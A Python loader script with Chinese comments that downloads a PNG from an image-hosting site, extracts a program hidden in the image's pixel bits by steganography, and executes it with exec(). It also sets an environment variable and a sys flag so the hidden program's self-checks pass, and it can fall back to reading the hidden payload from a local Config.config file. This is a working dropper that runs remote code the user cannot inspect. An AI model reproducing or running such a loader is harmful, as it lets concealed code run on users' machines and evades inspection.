#!/usr/bin/env python3

import os
import sys
import io
import threading
import requests
from PIL import Image

# ==================== 配置 ====================
IMAGE_URL = 'https://pic1.imgdb.cn/item/6a3aae89d01963d63bc38d9f.png'

# ==================== 辅助函数 ====================
def _has_gui():
    try:
        import tkinter
        tkinter.Tk().destroy()
        return True
    except:
        return False

def _extract(img_bytes):
    img = Image.open(io.BytesIO(img_bytes))
    pixels = list(img.getdata())
    mode = img.mode
    bits = []
    for p in pixels:
        for c in range(len(mode)):
            bits.append(p[c] & 1)
    data = bytearray()
    for i in range(0, len(bits) - 15, 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        data.append(b)
        if len(data) >= 2 and data[-2] == 0 and data[-1] == 0:
            return bytes(data[:-2])
    return bytes(data)

def _load_from_file(filepath):
    with open(filepath, 'rb') as f:
        img_data = f.read()
    script = _extract(img_data)
    if not script:
        raise RuntimeError('本地文件中未找到数据')
    return script

def _exec(script, args):
    """执行脚本，设置环境变量和内部标志以满足主程序的自检"""
    # 设置环境变量，使主程序的环境锁通过
    os.environ['SECURE_LOADER'] = '1'
    # 设置 sys._called_from_loader，使主程序的文件检测通过
    sys._called_from_loader = True

    g = {'__name__': '__main__', '__file__': '<script>', 'sys': sys}
    old_argv = sys.argv
    sys.argv = [sys.argv[0]] + args
    try:
        exec(script, g)
    finally:
        sys.argv = old_argv
        # 清理环境变量（可选）
        os.environ.pop('SECURE_LOADER', None)
        if hasattr(sys, '_called_from_loader'):
            del sys._called_from_loader

# ==================== GUI 加载界面 ====================
def _splash_and_run():
    import tkinter as tk
    from tkinter import ttk, messagebox

    root = tk.Tk()
    root.title('加载器')
    root.geometry('400x150')
    root.resizable(False, False)
    root.eval('tk::PlaceWindow . center')

    tk.Label(root, text='正在加载模块，请稍候...').pack(pady=10)
    progress = ttk.Progressbar(root, mode='indeterminate')
    progress.pack(fill='x', padx=20)
    progress.start(10)

    result = {'script': None, 'error': None}

    def load():
        try:
            resp = requests.get(IMAGE_URL, timeout=30)
            resp.raise_for_status()
            img_data = resp.content
            script = _extract(img_data)
            if not script:
                raise RuntimeError('未找到隐藏数据')
            result['script'] = script
            root.after(0, lambda: on_success(script))
        except Exception as e:
            root.after(0, lambda: on_error(str(e)))

    def on_success(script):
        progress.stop()
        root.destroy()
        print(f"[+] 加载 {len(script)} 字节代码，正在启动主程序...")
        _exec(script, [])

    def on_error(err_msg):
        progress.stop()
        root.destroy()
        root2 = tk.Tk()
        root2.withdraw()
        answer = messagebox.askyesno(
            '加载失败',
            f"远程加载失败：{err_msg}\n是否尝试从当前目录的 Config.config 加载？"
        )
        root2.destroy()
        if answer:
            config_path = os.path.join(os.getcwd(), 'Config.config')
            if not os.path.isfile(config_path):
                print('[!] 当前目录下未找到 Config.config 文件')
                sys.exit(1)
            try:
                script = _load_from_file(config_path)
                print(f"[+] 从本地加载 {len(script)} 字节代码，正在启动主程序...")
                _exec(script, [])
            except Exception as e:
                print(f"[!] 本地加载失败: {e}")
                sys.exit(1)
        else:
            sys.exit(1)

    threading.Thread(target=load, daemon=True).start()
    root.mainloop()

# ==================== 命令行模式 ====================
def main():
    args = sys.argv[1:]
    if args:
        try:
            resp = requests.get(IMAGE_URL, timeout=30)
            resp.raise_for_status()
            img_data = resp.content
            script = _extract(img_data)
            if not script:
                print('[!] 未找到隐藏数据')
                sys.exit(1)
            print(f"[+] 加载 {len(script)} 字节代码，正在执行...")
            _exec(script, args)
        except Exception as e:
            print(f"[!] 操作失败: {e}")
            sys.exit(1)
        return

    if not _has_gui():
        print('\n[!] 错误：当前环境不支持 GUI，且未提供命令行参数。')
        print('    请通过命令行参数指定操作模式，例如：')
        print('    python loader.py encrypt 文件路径 -o 输出路径 -p 密码')
        sys.exit(1)
    _splash_and_run()

if __name__ == '__main__':
    main()